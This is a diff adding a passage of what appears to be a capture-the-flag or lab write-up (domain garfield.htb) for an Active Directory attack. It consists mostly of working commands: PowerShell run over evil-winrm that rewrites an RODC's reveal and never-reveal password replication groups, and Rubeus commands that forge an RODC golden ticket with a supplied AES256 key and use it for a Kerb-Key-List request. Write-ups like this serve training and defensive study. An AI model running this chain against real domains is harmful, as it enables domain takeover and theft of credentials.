@@ -1,0 +1,29 @@
+```powershell
+# From evil-winrm as l.wilson_adm on DC01:
+
+# Add Administrator to allowed replication group
+Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
+  -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}
+
+# Clear ALL NeverRevealGroup entries
+# (Administrator is member of Administrators group which was in NeverRevealGroup)
+Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
+  -Clear "msDS-NeverRevealGroup"
+
+# Verify
+Get-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" `
+  -Properties msDS-NeverRevealGroup | Select-Object -ExpandProperty "msDS-NeverRevealGroup"
+# (empty — confirmed)
+```
+![](Attachments/Pasted%20image%2020260820064311.png)
+# Forge RODC Golden Ticket for Administrator
+```powershell
+Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
+```
+![](Attachments/Pasted%20image%2020260818140802.png)
+
+# Kerb-Key-List request using the Golden Ticket
+```powershell
+Rubeus.exe asktgs /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB7wTM2BnAfI78OmD+cI3eREprzTKZZn5Qn62XW0UmVrHUoF5Pr4s6GKMyd4uWht+ySAXehzTUjg1vMhTeKF3f4CCV9i++RfxD2j3iskUCj99ivPnylq8DXlxmx2GFQD3Q40IrDY1rjNiOcB4xle4AeDLKQPyqrZ7Y5fh0aXLOXvKTmcc2rSJY4EUob0gSQJ5a7YV0CZCWCNVQO5uzYcznUnZsCit9oEzJeofnK6ndwbZNX2c4svCb4T+1UglTjPiC9jlQ+r1XsbtcHo7p76qdbkTj4W/M3KA5PZDxNOkzLw3kbk3hRwz+EGCmCVKMhlFC49pS1fyAeOQ6XAuhM9JVYUsQISLzewwoIxdeq998EWI1NHLMRtl55MI3Ap3Y9vjSlb7ktq7hI/iUFzvhKXTc/15CQagIL0Bp0uxideXBMvdDvljzibJwQUIf1n3nwifheHw7HF+Vfyjy9/qEKp6DPyfisfPUFXMQHaYDuXOfHgUgJRUX1VcwPOLqmQYsDkpyLw8n2TF99B5vXE88NyfttKQokzoo/dRHiOcnhJvWCxzeYwLUgrvQqytjVXebIl93v8CIEeNao1fLX1+rcwipxjNNF2QkcNQin3dSC5/dE7cuP3i3uuxCLpJbzQJ8a59/VbUJREECmy90sHNqOa7j9OMoAsKD2N2j44dOwlIJf8H2XpzPV1WU8zJZ3CXqpE5xVGYBJ4XqI4lRqk8wfy3UZHHGAqOiu3j8CcBayugq2rFrndcZN5cAv2I5vPacr6VJYJQqyoQD94zkNAmYFUyU1TGmcoWwQA95tzNX8TVQFT/VHXep8lWtDTBZJLKsBAho1HxDiqLjOUTubayhQaTT+ftiyfJ7BL0hAMHBO5t6HX+ejr3wJ38bpCuUlQvrFVpt+7S8q7sfxIREDs5fFZcEDOT5Yi2Fjt7ZS70K4K7xSOZKRmGQ2TLnEqwV/10dILD/T8PwPIa5UbpShXfZbMosYVSRW1s7pWY5ddOSWJwJH8BMF2GO/zmRju8VpfTXdfziHgJ/+M6LpuyojX1/qjzL6Vd4Q1RWcwQo38eL7G1V66OpzOigPk/bVTkqf1r/XHDPT0RfsHiHi+AwxWmv3NxmkO84R4rBihWyyHxtNG7YHFsmVdMzFrV7aW/VutUf3RJloXDkF5H1chBojiMIjl2c853I0LCxV02JZSwhf3i/myGJUaalZ0XyC9OLwyPupj6ANVSu3PaY7tM/3NQC/S8xHryEOz6nHWXwJGd8FZOHIDv2IUvKuwvnJ92LJv9nDQa642W68xPB++mwLDtqM6OQUnBcFUSTshWAICw7q1KmmeFeuOZOSSW05flhierOsT09tfkU0JST7rmforqMBXT/hMci02lB37gux9U6RRubvdUNv38BPWRMl/38FKGX/Yo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgIqb7hkhVuTebu8aoFpoElPxqQzbpOgbsaFa1hJLYvwKhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDgyMDA3Mzk0NFqlERgPMjAyNjA4MjAwNzM5NDRaphEYDzIwMjYwODIwMTczOTQ0WqcRGA8yMDI2MDgyNzA3Mzk0NFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI= /nowrap
+```
+  ![](Attachments/Pasted%20image%2020260820064250.png)
